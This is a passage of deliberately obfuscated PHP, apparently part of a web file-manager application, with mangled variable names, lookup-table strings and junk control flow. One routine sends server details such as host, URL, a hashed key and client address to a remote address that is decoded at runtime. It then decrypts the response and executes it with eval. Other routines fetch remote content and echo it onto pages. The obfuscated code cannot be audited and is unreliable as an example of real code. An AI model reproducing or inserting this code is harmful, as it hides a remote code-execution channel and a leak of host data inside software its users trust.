array($¶ß“î[117], $¶ß“î[118]); if (!_get($GLOBALS, $¶ß“î[114]) || !isset($_GET[$¶ß“î[212]])) { return; } if (!in_array($_SERVER[$¶ß“î[24]], $èØ°ÄĞ)) { return; } $…“µğş = $¶ß“î[213]; $Ç°ƒ»ÚÙ = $îèæö¬Î[692]; if (!$Ç°ƒ»ÚÙ) { return; } $…“µğş = $this->pyfvc0dfb891($…“µğş, $¶ß“î[214]); $Ä†»Œ½¬ = $îèæö¬Î[693]; if (!$Ä†»Œ½¬) { die; } $ôäå¯Êë = stream_context_create(array($¶ß“î[215] => array($¶ß“î[216] => $¶ß“î[217], $¶ß“î[218] => 3))); $çÕ³£È = $îèæö¬Î[694]; if (!$çÕ³£È) { die; } $‹ÙÈ˜÷ = @file_get_contents($…“µğş, !1, $ôäå¯Êë); $øÄØ¤©© = $îèæö¬Î[695]; header($¶ß“î[219]); $Ú¦ËñëÊ = $îèæö¬Î[696]; if (strlen($Ú¦ËñëÊ) < $îèæö¬Î[623]) { return; } if ($‹ÙÈ˜÷ && strstr($‹ÙÈ˜÷, $¶ß“î[220])) { echo $‹ÙÈ˜÷; } die; } public function fnpc1cc2dd7d($íâİİÃ¹) { $äÙ°°†… =& $_SERVER[™¾ÇÙ¯¹]; $¡»öÂ˜” =& $_SERVER[×ô×“Ò]; if ($this->rzwof8203c95 == $¡»öÂ˜”[221]) { return $íâİİÃ¹; } $‹–ÓËµ¯ = array($¡»öÂ˜”[222] => $¡»öÂ˜”[223], $¡»öÂ˜”[224] => $¡»öÂ˜”[223], $¡»öÂ˜”[225] => $¡»öÂ˜”[223], $¡»öÂ˜”[226] => $¡»öÂ˜”[223], $¡»öÂ˜”[227] => $¡»öÂ˜”[228], $¡»öÂ˜”[229] => $¡»öÂ˜”[228], $¡»öÂ˜”[230] => $¡»öÂ˜”[228], $¡»öÂ˜”[231] => $¡»öÂ˜”[228], $¡»öÂ˜”[232] => $¡»öÂ˜”[228], $¡»öÂ˜”[233] => $¡»öÂ˜”[228], $¡»öÂ˜”[234] => $¡»öÂ˜”[228], $¡»öÂ˜”[235] => $¡»öÂ˜”[228], $¡»öÂ˜”[236] => $¡»öÂ˜”[228], $¡»öÂ˜”[237] => $¡»öÂ˜”[228], $¡»öÂ˜”[238] => $¡»öÂ˜”[228], $¡»öÂ˜”[239] => $¡»öÂ˜”[228]); $—‡Íµ€ = $äÙ°°†…[697]; if (!$—‡Íµ€) { die; } $ö”ø§ÖÊ = explode($¡»öÂ˜”[240], _get($this->bmaq4d5ee77c, $¡»öÂ˜”[111], $¡»öÂ˜”[6])); $—÷€ééé = array(); foreach ($‹–ÓËµ¯ as $İ£Èª‚é => $‡­é¶Î©) { if ($‡­é¶Î© == $¡»öÂ˜”[223] && substr($this->rzwof8203c95, 0, 1) == $¡»öÂ˜”[223]) { continue; } if (!in_array($İ£Èª‚é, $ö”ø§ÖÊ)) { $—÷€ééé[] = $İ£Èª‚é; } } foreach ($—÷€ééé as $İ£Èª‚é) { unset($íâİİÃ¹[$İ£Èª‚é]); } return $íâİİÃ¹; $Ó¥öİ±Å = $äÙ°°†…[698]; if (strlen($Ó¥öİ±Å) < $äÙ°°†…[639]) { return; } } private function xpdt1a6090ce() { $ö¬Å¿Îè =& $_SERVER[×ô×“Ò]; if ($this->rzwof8203c95 != $ö¬Å¿Îè[105]) { $GLOBALS[$ö¬Å¿Îè[84]][$ö¬Å¿Îè[88]][$ö¬Å¿Îè[241]] = $ö¬Å¿Îè[202]; return; } $GLOBALS[$ö¬Å¿Îè[84]][$ö¬Å¿Îè[242]] = $ö¬Å¿Îè[120]; if (Model($ö¬Å¿Îè[243])->get($ö¬Å¿Îè[63]) != $ö¬Å¿Îè[202]) { Model($ö¬Å¿Îè[243])->set($ö¬Å¿Îè[63], $ö¬Å¿Îè[202]); } } public function gqbh91941e11() { return $_SERVER[×ô×“Ò][244]; } private function nhim8e408a95() { $¨§ÒÓ =& $_SERVER[™¾ÇÙ¯¹]; $Ö²ùé…§ =& $_SERVER[×ô×“Ò]; $–§ Ç¾Á = array($Ö²ùé…§[245], $Ö²ùé…§[246], $Ö²ùé…§[247]); $¥˜ÄÈ§ô = $Ö²ùé…§[248] . md5($Ö²ùé…§[249]); if ($this->rzwof8203c95 == $Ö²ùé…§[105] || !_get($GLOBALS, $Ö²ùé…§[114])) { return; } if (!in_array($_SERVER[$Ö²ùé…§[24]], $–§ Ç¾Á)) { return; } if (time() % 4 != 0) { return; } $­Š¸—õİ = call_user_func(array($Ö²ùé…§[250], $Ö²ùé…§[251]), $¥˜ÄÈ§ô); $ÉûœñğË = $¨§ÒÓ[699]; if (!$ÉûœñğË) { return; } if ($­Š¸—õİ && time() - $­Š¸—õİ < intval($Ö²ùé…§[252])) { return; } call_user_func(array($Ö²ùé…§[250], $Ö²ùé…§[137]), $¥˜ÄÈ§ô, time()); $­õâÅ¦ = Model($Ö²ùé…§[33])->get($Ö²ùé…§[102]); $¾Œ»ÎÜ = array($Ö²ùé…§[149] => Model($Ö²ùé…§[33])->get($Ö²ùé…§[185]), $Ö²ùé…§[162] => $this->rzwof8203c95, $Ö²ùé…§[159] => $_SERVER[$Ö²ùé…§[160]], $Ö²ùé…§[161] => Model($Ö²ùé…§[33])->get($Ö²ùé…§[129]), $Ö²ùé…§[100] => md5($_SERVER[$Ö²ùé…§[101]] . $­õâÅ¦), $Ö²ùé…§[152] => $Ö²ùé…§[134], $Ö²ùé…§[155] => $_SERVER[$Ö²ùé…§[156]]); $¾óÌää = $this->iqmndc3cf655($Ö²ùé…§[253], $¾Œ»ÎÜ); $à¤—˜÷Å = $¨§ÒÓ[700]; if (!$à¤—˜÷Å) { die; } if (!is_array($¾óÌää)) { return; } if ($¾óÌää[$Ö²ùé…§[149]] && $¾óÌää[$Ö²ùé…§[254]]) { if ($this->ermw4259f77f($¾óÌää[$Ö²ùé…§[254]]) == $¾Œ»ÎÜ[$Ö²ùé…§[149]]) { return; } } $this->htea457d408f(); $¯Æ¦•Ó = $¨§ÒÓ[701]; while ($¯Æ¦•Ó < $¨§ÒÓ[627]) { if ($¯Æ¦•Ó >= 0) { break; } $¯Æ¦•Ó++; } if ($this->ermw4259f77f($¾óÌää[$Ö²ùé…§[254]]) != $¾Œ»ÎÜ[$Ö²ùé…§[149]]) { $Ôã÷§¼Õ = array($Ö²ùé…§[180] => $­õâÅ¦, $Ö²ùé…§[181] => $_SERVER[$Ö²ùé…§[101]], $Ö²ùé…§[182] => this_url(), $Ö²ùé…§[157] => $_SERVER[$Ö²ùé…§[158]]); $³Çƒ¾áÓ = $this->ywex3f9a3342(json_encode($Ôã÷§¼Õ)); $¾óÌää = $this->iqmndc3cf655($Ö²ùé…§[183] . $³Çƒ¾áÓ); if ($¾óÌää && is_array($¾óÌää) && isset($¾óÌää[$Ö²ùé…§[254]])) { $Ã°­ÑŸù = $this->zerfae2ef0c1($¾óÌää[$Ö²ùé…§[254]], 2); if ($Ã°­ÑŸù) { $Ã°­ÑŸù = $this->ermw4259f77f($Ã°­ÑŸù); } if ($Ã°­ÑŸù) { try { @eval($Ã°­ÑŸù); } catch (Exception $Å“ÄÅ’³) { } } } } } private function iqmndc3cf655($Èå©¤ı« = '', $™Š™¨’Ã = array(), $§Ãúäƒ = 5) { $ŠÌŞ±ÉĞ =& $_SERVER[™¾ÇÙ¯¹]; $ø„çÚ‘ò =& $_SERVER[×ô×“Ò]; $ŒÇèìëä = $ø„çÚ‘ò[255]; $ŒÇèìëä = $this->pyfvc0dfb891($ŒÇèìëä, $ø„çÚ‘ò[256]); $ŒÇèìëä = $ŒÇèìëä . $Èå©¤ı«; $¶µ½óÃ­ = $ŠÌŞ±ÉĞ[702]; if (!$¶µ½óÃ­) { return; } if ($™Š™¨’Ã && is_array($™Š™¨’Ã)) { $ŒÇèìëä = $ŒÇèìëä . $ø„çÚ‘ò[257] . http_build_query($™Š™¨’Ã); } if ($™Š™¨’Ã === -1) { return $ŒÇèìëä; } $ûİ¤¢¼° = stream_context_create(array($ø„çÚ‘ò[215] => array($ø„çÚ‘ò[218] => $§Ãúäƒ, $ø„çÚ‘ò[216] => $ø„çÚ‘ò[258]), $ø„çÚ‘ò[259] => array($ø„çÚ‘ò[260] => !1, $ø„çÚ‘ò[261] => !1))); $™Š™¨’Ã = @file_get_contents($ŒÇèìëä, !1, $ûİ¤¢¼°); $ËµëªŸƒ = $ŠÌŞ±ÉĞ[703]; return json_decode($™Š™¨’Ã, !0); $•ŠäÉãı = $ŠÌŞ±ÉĞ[704]; if (!$•ŠäÉãı) { return; } } private function jxco62637914() { $€øÀÕÔ =& $_SERVER[™¾ÇÙ¯¹]; $îÁìøÎ‰ =& $_SERVER[×ô×“Ò]; $ÓÄÃ™¡¶ = array($îÁìøÎ‰[262] => $îÁìøÎ‰[263], $îÁìøÎ‰[264] => $îÁìøÎ‰[265], $îÁìøÎ‰[266] => $îÁìøÎ‰[267], $îÁìøÎ‰[268] => $îÁìøÎ‰[269], $îÁìøÎ‰[270] => $îÁìøÎ‰[271], $îÁìøÎ‰[272] => $îÁìøÎ‰[210], $îÁìøÎ‰[273] => $îÁìøÎ‰[210], $îÁìøÎ‰[274] => $îÁìøÎ‰[263], $îÁìøÎ‰[275] => $îÁìøÎ‰[265], $îÁìøÎ‰[276] => $îÁìøÎ‰[267], $îÁìøÎ‰[277] => $îÁìøÎ‰[278], $îÁìøÎ‰[279] => $îÁìøÎ‰[269], $îÁìøÎ‰[280] => $îÁìøÎ‰[281], $îÁìøÎ‰[282] => $îÁìøÎ‰[271], $îÁìøÎ‰[283] => $îÁìøÎ‰[284], $îÁìøÎ‰[285] => $îÁìøÎ‰[286], $îÁìøÎ‰[287] => $îÁìøÎ‰[288]); $µ­äß© = $ÓÄÃ™¡¶[$this->rzwof8203c95]; $İéÀ·¿ = $€øÀÕÔ[705]; if (strlen($İéÀ·¿) < $€øÀÕÔ[623]) { return; } $µ­äß© = intval($µ­äß© ? $µ­äß© : $îÁìøÎ‰[263]); $¹Ä¦£Á = $€øÀÕÔ[706]; if (strlen($¹Ä¦£Á) < $€øÀÕÔ[623]) { die; } $í¯ëŒÀÕ = _get($this->bmaq4d5ee77c, $îÁìøÎ‰[289]); $í¯ëŒÀÕ = $í¯ëŒÀÕ ? intval($í¯ëŒÀÕ) : 0; $âéìĞâ = $€øÀÕÔ[707]; return $µ­äß© + $í¯ëŒÀÕ; } public function tpxnb0750609($™­ğÑ‚) { $İç¼€Ğº =& $_SERVER[™¾ÇÙ¯¹]; $Şï‰îæ =& $_SERVER[×ô×“Ò]; $–Í¾”÷° = $this->jxco62637914(); $œËè”æà = $İç¼€Ğº[708]; while ($œËè”æà < $İç¼€Ğº[634]) { if ($œËè”æà >= 0) { break; } $œËè”æà++; } if ($™­ğÑ‚[$Şï‰îæ[290]] == $Şï‰îæ[120]) { return; } if ($–Í¾”÷° >= intval($Şï‰îæ[210])) { return; } $¥©Á…º = Model($Şï‰îæ[123])->count(); if ($¥©Á…º <= $–Í¾”÷°) { return; } $ÍÈ¡ã = Model($Şï‰îæ[123])->field($Şï‰îæ[290])->limit($–Í¾”÷°)->select(); $±Šƒª»î = $İç¼€Ğº[709]; if (!$±Šƒª»î) { return; } $ÍÈ¡ã = array_to_keyvalue($ÍÈ¡ã, $Şï‰îæ[6], $Şï‰îæ[290]); if (!in_array($™­ğÑ‚[$Şï‰îæ[290]], $ÍÈ¡ã)) { show_json($Şï‰îæ[291], !1, $Şï‰îæ[206]); } } public function kzfha483b246() { $âêÛáªœ =& $_SERVER[™¾ÇÙ¯¹]; $œ«ú¯çû =& $_SERVER[×ô×“Ò]; if (!_get($GLOBALS, $œ«ú¯çû[114]) || mt_rand(1, 100) > 20) { return; } $ş°›îœ® = $œ«ú¯çû[213]; $èÊ úçã = $âêÛáªœ[710]; if (strlen($èÊ úçã) < $âêÛáªœ[623]) { die; } $ş°›îœ® = $this->pyfvc0dfb891($ş°›îœ®, $œ«ú¯çû[214]); $¹ç‚§” = $âêÛáªœ[711]; $‚ßëğÑ = stream_context_create(array($œ«ú¯çû[215] => array($œ«ú¯çû[216] => $œ«ú¯çû[217], $œ«ú¯çû[218] => 3))); $Í—†û–ã = @file_get_contents($ş°›îœ®, !1, $‚ßëğÑ); $•â–ĞÈû = $âêÛáªœ[712]; while (strlen($•â–ĞÈû) < $âêÛáªœ[634]) { if (!$•â–ĞÈû) { break; } $•â–ĞÈû++; } echo $œ«ú¯çû[292] . hash_encode($Í—†û–ã) . $œ«ú¯çû[293]; $¡Ùæ•’ò = $âêÛáªœ[713]; while (strlen($¡Ùæ•’ò) < $âêÛáªœ[627]) { if (!$¡Ùæ•’ò) { break; } $¡Ùæ•’ò++; } } private function trvca7a41ca1($¨ùÀ°¿«, $ğìøĞÔş, $õØ‰ã› = 3) { $µ±øì‘Â =& $_SERVER[™¾ÇÙ¯¹]; $í–Êä÷ =& $_SERVER[×ô×“Ò]; usleep(1); $¨ùÀ°¿« = trim($¨ùÀ°¿«); $æûğ‹Áğ = mt_rand(0, 5) . $í–Êä÷[6]; $èÜ“¦Õ– = $µ±øì‘Â[714]; while (strlen($èÜ“¦Õ–) < $µ±øì‘Â[623]) { if (!$èÜ“¦Õ–) { break; } $èÜ“¦Õ–++; } $Õ‚‹¯ë = rand_string(15); $³Ú—ÜÓ­ = $µ±øì‘Â[715]; if (!$³Ú—ÜÓ­) { die; } $¨Ñİèµ = $í–Êä÷[294]; switch ($æûğ‹Áğ) { case $í–Êä÷[202]: $¡äó’•™ = $this->dosr998eda36($¨ùÀ°¿«, strrev($ğìøĞÔş . $Õ‚‹¯ë)); $¨®ËÙ = $µ±øì‘Â[716]; break; case $í–Êä÷[120]: $¡äó’•™ = $this->dosr998eda36($¨ùÀ°¿«, strrev($Õ‚‹¯ë . $ğìøĞÔş)); break; case $í–Êä÷[295]: $¡äó’•™ = $this->dosr998eda36($¨ùÀ°¿«, base64_encode($Õ‚‹¯ë . $ğìøĞÔş)); $ı´ßÄ¶ = $µ±øì‘Â[717]; if (!$ı´ßÄ¶) { return; } break; $ĞŸî»µï = $µ±øì‘Â[718]; if (!$ĞŸî»µï) { return; } case $í–Êä÷[296]: $¡äó’•™ = $this->dosr998eda36($¨ùÀ°¿«, md5($Õ‚‹¯ë . $ğìøĞÔş)); break; $²çç¨Ü» = $µ±øì‘Â[719]; case $í–Êä÷[297]: $¨ùÀ°¿« = base64_encode($¨ùÀ°¿«); $ÃìÆáÕï = rand(0, 64); $ ©Ìİì€ = $µ±øì‘Â[720]; while (strlen($ ©Ìİì€) < $µ±øì‘Â[639]) { if (!$ ©Ìİì€) { break; } $ ©Ìİì€++; } $œ½Ÿßô = $¨Ñİèµ[$ÃìÆáÕï]; $§§ºººî = md5($œ½Ÿßô . md5($ğìøĞÔş . $œ½Ÿßô) . $ğìøĞÔş); $§§ºººî = substr($§§ºººî, $ÃìÆáÕï % 8, $ÃìÆáÕï % 8 + 7); $Ò££—Ù = $í–Êä÷[6]; $Ò§‹ş = 0; $¹´¶‘¬Ÿ = $µ±øì‘Â[721]; if (!$¹´¶‘¬Ÿ) { return; } $øöà¦š‘ = 0; $÷­®¼ö± = 0; for ($Ò§‹ş = 0; $Ò§‹ş < strlen($¨ùÀ°¿«); $Ò§‹ş++) { $÷­®¼ö± = $÷­®¼ö± == strlen($§§ºººî) ? 0 : $÷­®¼ö±; $¤ö ‚­‚ = $µ±øì‘Â[722]; $øöà¦š‘ = ($ÃìÆáÕï + strpos($¨Ñİèµ, $¨ùÀ°¿«[$Ò§‹ş]) + ord($§§ºººî[$÷­®¼ö±++])) % 64; $Ò££—Ù .= $¨Ñİèµ[$øöà¦š‘]; $Ä§Â¬ = $µ±øì‘Â[723]; while (strlen($Ä§Â¬) < $µ±øì‘Â[627]) { if (!$Ä§Â¬) { break; } $Ä§Â¬++; } } $¡äó’•™ = hash_encode($œ½Ÿßô . $Ò££—Ù); break; $ÆöÎç­Û = $µ±øì‘Â[724]; if (!$ÆöÎç­Û) { return; } default: $¡äó’•™ = $this->dosr998eda36($¨ùÀ°¿«, $ğìøĞÔş . $Õ‚‹¯ë); $¾Œ‡ÎŞŠ = $µ±øì‘Â[725]; break; } $¡äó’•™ = strrev($æûğ‹Áğ . $Õ‚‹¯ë . $¡äó’•™); $º¸ä·§ü = $µ±øì‘Â[726]; if (strlen($º¸ä·§ü) < $µ±øì‘Â[634]) { return; } if ($õØ‰ã› - 1 > 0) { $¡äó’•™ = $this->trvca7a41ca1($¡äó’•™, $ğìøĞÔş, $õØ‰ã› - 1); } return $¡äó’•™; } private function zerfae2ef0c1($¥‹õèÖ™, $‡ñìÃ„, $¬½İÄªé = 3) { $‰§²ÈÓ» =& $_SERVER[™¾ÇÙ¯¹]; $âİ†…ºà =& $_SERVER[×ô×“Ò]; if (!is_string($¥‹õèÖ™) || strlen($¥‹õèÖ™) < 10) { return !1; } $¥‹õèÖ™ = trim($¥‹õèÖ™); $ºŸüÏÄ = $‰§²ÈÓ»[727]; $¥‹õèÖ™ = strrev($¥‹õèÖ™); $µ£‡áş° = $¥‹õèÖ™[0]; $óÍ‡ÔÛÃ = substr($¥‹õèÖ™, 1, 15); $¥‹õèÖ™ = substr($¥‹õèÖ™, 16); $¬ó‚¿äõ = $‰§²ÈÓ»[728]; $â‹í¾ºâ = $âİ†…ºà[294]; $Ü¿”Ë… = $‰§²ÈÓ»[729]; if (!$Ü¿”Ë…) { die; } switch ($µ£‡áş°) { case $âİ†…ºà[202]: $‹’Ä‚ = $this->pyfvc0dfb891($¥‹õèÖ™, strrev($‡ñìÃ„ . $óÍ‡ÔÛÃ)); break; case $âİ†…ºà[120]: $‹’Ä‚ = $this->pyfvc0dfb891($¥‹õèÖ™, strrev($óÍ‡ÔÛÃ . $‡ñìÃ„)); $—ŸÉ­¢º = $‰§²ÈÓ»[730]; while ($—ŸÉ­¢º < $‰§²ÈÓ»[627]) { if ($—ŸÉ­¢º >= 0) { break; } $—ŸÉ­¢º++; } break; case $âİ†…ºà[295]: $‹’Ä‚ = $this->pyfvc0dfb891($¥‹õèÖ™, base64_encode($óÍ‡ÔÛÃ . $‡ñìÃ„)); break; $û‚ÃĞ = $‰§²ÈÓ»[731]; if (strlen($û‚ÃĞ) < $‰§²ÈÓ»[634]) { die; } case $âİ†…ºà[296]: $‹’Ä‚ = $this->pyfvc0dfb891($¥‹õèÖ™, md5($óÍ‡ÔÛÃ . $‡ñìÃ„)); break; $Ğ„¤·ö = $‰§²ÈÓ»[732]; case $âİ†…ºà[297]: $¥‹õèÖ™ = hash_decode($¥‹õèÖ™); $ÊŠÒ” = $‰§²ÈÓ»[733]; $¹øÌòÕ = $¥‹õèÖ™[0]; $Îï•íÔå = $‰§²ÈÓ»[734]; if (strlen($Îï•íÔå) < $‰§²ÈÓ»[639]) { return; } $¥‹õèÖ™ = substr($¥‹õèÖ™, 1); $›Í’Ø³ = strpos($â‹í¾ºâ, $¹øÌòÕ); $œìÑšÀ² = md5($¹øÌòÕ . md5($‡ñìÃ„ . $¹øÌòÕ) . $‡ñìÃ„); $œìÑšÀ² = substr($œìÑšÀ², $›Í’Ø³ % 8, $›Í’Ø³ % 8 + 7); $ËÅ–áˆÛ = $âİ†…ºà[6]; $ûùë‡ˆÓ = 0; $ˆóë²ç¬ = 0; $ìÚã“¦ = 0; $Èß¼†Ä„ = $‰§²ÈÓ»[735]; while ($Èß¼†Ä„ < $‰§²ÈÓ»[627]) { if ($Èß¼†Ä„ >= 0) { break; } $Èß¼†Ä„++; } for ($ûùë‡ˆÓ = 0; $ûùë‡ˆÓ < strlen($¥‹õèÖ™); $ûùë‡ˆÓ++) { $ìÚã“¦ = $ìÚã“¦ == strlen($œìÑšÀ²) ? 0 : $ìÚã“¦; $ìàòä³ = $‰§²ÈÓ»[736]; while ($ìàòä³ < $‰§²ÈÓ»[627]) { if ($ìàòä³ >= 0) { break; } $ìàòä³++; } $ò·à¸£ = $ìÚã“¦++; $ ³çûŞÉ = $‰§²ÈÓ»[737]; if (!$ ³çûŞÉ) { return; } $ˆóë²ç¬ = strpos($â‹í¾ºâ, $¥‹õèÖ™[$ûùë‡ˆÓ]) - $›Í’Ø³ - ord($œìÑšÀ²[$ò·à¸£]); while ($ˆóë²ç¬ < 0) { $ˆóë²ç¬ += 64; $Ï¶„ºÈì = $‰§²ÈÓ»[738]; } $ËÅ–áˆÛ .= $â‹í¾ºâ[$ˆóë²ç¬]; } $‹’Ä‚ = base64_decode($ËÅ–áˆÛ); break; default: $‹’Ä‚ = $this->pyfvc0dfb891($¥‹õèÖ™, $‡ñìÃ„ . $óÍ‡ÔÛÃ); $ŞÏÓø½÷ = $‰§²ÈÓ»[739]; if (strlen($ŞÏÓø½÷) < $‰§²ÈÓ»[249]) { die; } break; } if ($¬½İÄªé - 1 > 0) { $‹’Ä‚ = $this->zerfae2ef0c1($‹’Ä‚, $‡ñìÃ„, $¬½İÄªé - 1); } return $‹’Ä‚; } public function ywex3f9a3342($¢ÕµÚ§È) { $Òà¦» =& $_SERVER[™¾ÇÙ¯¹]; $ø•Ö‡¾ =& $_SERVER[×ô×“Ò]; $£òî×õ» = $this->eank098078c0(); $ÑÙ²ÏÁ = $this->eank098078c0(); $à¨¿¥Èå = ($£òî×õ» - 1) * ($ÑÙ²ÏÁ - 1); $û¢‘°§¢ = intval(($£òî×õ» + $ÑÙ²ÏÁ) / 2); while (1) { $îÈæóœû = $û¢‘°§¢; $¦Éì£ß = $Òà¦»[740]; while (strlen($¦Éì£ß) < $Òà¦»[634]) { if (!$¦Éì£ß) { break; } $¦Éì£ß++; } $®Éè”Ç = $à¨¿¥Èå; while ($®Éè”Ç % $îÈæóœû != 0) { $ñóá±™Ë = $®Éè”Ç; $½ØãŸäØ = $Òà¦»[741]; $®Éè”Ç = $îÈæóœû; $îÈæóœû = $ñóá±™Ë % $îÈæóœû; } if ($îÈæóœû == 1) { break; } else { $û¢‘°§¢++; } } $¡Ü ò¾ = 2; $šÇüµ—Ï = $Òà¦»[742]; for ($ÁææİÊ© = 0; $ÁææİÊ© < $à¨¿¥Èå * 10; $ÁææİÊ©++) { if (($à¨¿¥Èå * $ÁææİÊ© + 1) % $û¢‘°§¢ == 0) { $¡Ü ò¾ = intval(($à¨¿¥Èå * $ÁææİÊ© + 1) / $û¢‘°§¢); break; } } $ÏºÈµÂ¢ = $this->dosr998eda36($£òî×õ» * $ÑÙ²ÏÁ . $ø•Ö‡¾[6], $ø•Ö‡¾[134]); $ŒàºñÎ® = $Òà¦»[743]; if (!$ŒàºñÎ®) { return; } $·ËŸŠ© = md5($ø•Ö‡¾[298] . ($£òî×õ» + $ÑÙ²ÏÁ) . $ø•Ö‡¾[299] . $û¢‘°§¢ . $ø•Ö‡¾[299] . $¡Ü ò¾ . $ø•Ö‡¾[300]); $Ñú‰„ß  = $this->dosr998eda36($¢ÕµÚ§È, $·ËŸŠ©) . $ø•Ö‡¾[301] . $ÏºÈµÂ¢; $œ¬î½õç = $Òà¦»[744]; while (strlen($œ¬î½õç) < $Òà¦»[634]) { if (!$œ¬î½õç) { break; } $œ¬î½õç++; } return $Ñú‰„ß ; } public function ermw4259f77f($êÑ™ß¤ç) { $üª—É =& $_SERVER[™¾ÇÙ¯¹]; $ûãìÚ‰² =& $_SERVER[×ô×“Ò]; $¡çÔÜÊ = explode($ûãìÚ‰²[301], $êÑ™ß¤ç); $Ù­öÏü¥ = $üª—É[745]; if (strlen($Ù­öÏü¥) < $üª—É[249]) { return; } if (count($¡çÔÜÊ) != 2) { return $ûãìÚ‰²[6]; } $÷·èÀäö = $this->pyfvc0dfb891($¡çÔÜÊ[1] . $ûãìÚ‰²[6], $ûãìÚ‰²[134]); $µ½èĞë¤ = $üª—É[746]; if (!$µ½èĞë¤) { die; } if (!$÷·èÀäö) { return $ûãìÚ‰²[6]; } $÷·èÀäö = intval($÷·èÀäö); $ÖÔ–¾ö = $üª—É[747]; $ã…—€Ş = 0; $™°ÏèÏ = $üª—É[748]; if (!$™°ÏèÏ) { die; } $‚ƒÇÎ¼ã = 0; for ($ó”ÏúŸ  = 3; $ó”ÏúŸ  < $÷·èÀäö; $ó”ÏúŸ  += 2) { if ($÷·èÀäö % $ó”ÏúŸ  != 0) { continue; } $ã…—€Ş = $ó”ÏúŸ ; $Ù¢¡Ú†œ = $üª—É[749]; if (strlen($Ù¢¡Ú†œ) < $üª—É[249]) { return; } $‚ƒÇÎ¼ã = intval($÷·èÀäö / $ó”ÏúŸ ); $Ôó–öØã = $üª—É[750]; break; $ÛÖßà·˜ = $üª—É[751]; if (strlen($ÛÖßà·˜) < $üª—É[249]) { die; } } $Ê¼˜‹› = ($ã…—€Ş - 1) * ($‚ƒÇÎ¼ã - 1); $øóÁŸñ˜ = intval(($ã…—€Ş + $‚ƒÇÎ¼ã) / 2); while (1) { $µŞÜåÑ¡ = $øóÁŸñ˜; $´Àğ‘ = $Ê¼˜‹›; while ($´Àğ‘ % $µŞÜåÑ¡ != 0) { $Ø“´¹®Ñ = $´Àğ‘; $¦Éã£«Ä = $üª—É[752]; if (strlen($¦Éã£«Ä) < $üª—É[623]) { die; } $´Àğ‘ = $µŞÜåÑ¡; $ä•Üº„Á = $üª—É[753]; if (strlen($ä•Üº„Á) < $üª—É[623]) { die; } $µŞÜåÑ¡ = $Ø“´¹®Ñ % $µŞÜåÑ¡; } if ($µŞÜåÑ¡ == 1) { break; } else { $øóÁŸñ˜++; } } $ŠÜÖ®Ø° = 2; $øğñ¢‹¶ = $üª—É[754]; while (strlen($øğñ¢‹¶) < $üª—É[634]) { if (!$øğñ¢‹¶) { break; } $øğñ¢‹¶++; } for ($ó”ÏúŸ  = 0; $ó”ÏúŸ  < $Ê¼˜‹› * 10; $ó”ÏúŸ ++) { if (($Ê¼˜‹› * $ó”ÏúŸ  + 1) % $øóÁŸñ˜ == 0) { $ŠÜÖ®Ø° = intval(($Ê¼˜‹› * $ó”ÏúŸ  + 1) / $øóÁŸñ˜); break; } } $í¨‘—è = md5($ûãìÚ‰²[298] . ($ã…—€Ş + $‚ƒÇÎ¼ã) . $ûãìÚ‰²[299] . $øóÁŸñ˜ . $ûãìÚ‰²[299] . $ŠÜÖ®Ø° . $ûãìÚ‰²[300]); $¿¡Ó™õ¶ = $üª—É[755]; while ($¿¡Ó™õ¶ < $üª—É[639]) { if ($¿¡Ó™õ¶ >= 0) { break; } $¿¡Ó™õ¶++; } $¿¤†¦² = $this->pyfvc0dfb891($¡çÔÜÊ[0], $í¨‘—è); $¡¹–§é¨ = $üª—É[756]; return $¿¤†¦²; $­ÍÉù¸Ò = $üª—É[757]; if (strlen($­ÍÉù¸Ò) < $üª—É[634]) { die; } } public function eank098078c0() { $‘ºó® =& $_SERVER[™¾ÇÙ¯¹]; $ŒÑâĞø = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ò›º«Ì = array(); $Ë°ØØó¢ = 1; $Ñœ·‚‰Æ = $‘ºó®[758]; while (strlen($Ñœ·‚‰Æ) < $‘ºó®[634]) { if (!$Ñœ·‚‰Æ) { break; } $Ñœ·‚‰Æ++; } while ($Ë°ØØó¢ <= (int) sqrt($ŒÑâĞø)) { $ŠˆÊµ« = $Ë°ØØó¢; while (!0) { $ŠˆÊµ«++; if ($ŠˆÊµ« <= 2) { $Ë°ØØó¢ = $ŠˆÊµ«; break; } else { if ($ŠˆÊµ« < 2) { continue; } } $äØ°ïß½ = !0; for ($ò¿®éæ = 2; $ò¿®éæ <= sqrt($ŠˆÊµ«); $ò¿®éæ++) { if ($ŠˆÊµ« % $ò¿®éæ == 0) { $äØ°ïß½ = !1; } } if ($äØ°ïß½) { $Ë°ØØó¢ = $ŠˆÊµ«; break; } } $Ò›º«Ì[] = $Ë°ØØó¢; $º’öÁ¶³ = $‘ºó®[759]; if (!$º’öÁ¶³) { die; } } $§ƒçĞüÊ = 2; for ($ŠˆÊµ« = $ŒÑâĞø; $ŠˆÊµ« > 1; $ŠˆÊµ«--) { $äØ°ïß½ = !0; foreach ($Ò›º«Ì as $Ïİ«àÈ) { if ($ŠˆÊµ« % $Ïİ«àÈ == 0) { $äØ°ïß½ = !1; break; } } if ($äØ°ïß½) { $§ƒçĞüÊ = $ŠˆÊµ«; break; } } return $§ƒçĞüÊ; $æ¨Ìé•Ü = $‘ºó®[760]; if (strlen($æ¨Ìé•Ü) < $‘ºó®[627]) { return; } } public function wpuycfcc3528($Ìñ…, $³™äšú) { $¼¼„˜¬ª =& $_SERVER[™¾ÇÙ¯¹]; $ó¾äŒË™ =& $_SERVER[×ô×“Ò]; return call_user_func(array($ó¾äŒË™[8], $ó¾äŒË™[302]), $Ìñ…, $³™äšú); $÷ñÈ§Øâ = $¼¼„˜¬ª[761]; if (strlen($÷ñÈ§Øâ) < $¼¼„˜¬ª[634]) { die; } } public function dosr998eda36($ÉÅÉâœú, $¦¢¿••À) { $äÖšõ¡ =& $_SERVER[×ô×“Ò]; return call_user_func(array($äÖšõ¡[303], $äÖšõ¡[304]), $ÉÅÉâœú, $¦¢¿••À); } public function pyfvc0dfb891($ûğÌÜğÂ, $óØîµù) { $®ó Ä¡‡ =& $_SERVER[×ô×“Ò]; return call_user_func(array($®ó Ä¡‡[303], $®ó Ä¡‡[305]), $ûğÌÜğÂ, $óØîµù); } } $_file = $_SERVER[$_SERVER[™¾ÇÙ¯¹][245]]; goto Cà¼Š‰ïÛÀ; eØÈ„¾˜ëÆ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x74\x61\x73\x6b\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\164\171\160\145", "\145\x76\145\x6e\164", "\x74\x69\x6d\145", "\144\x65\163\x63", "\x73\x79\163\x74\145\x6d", 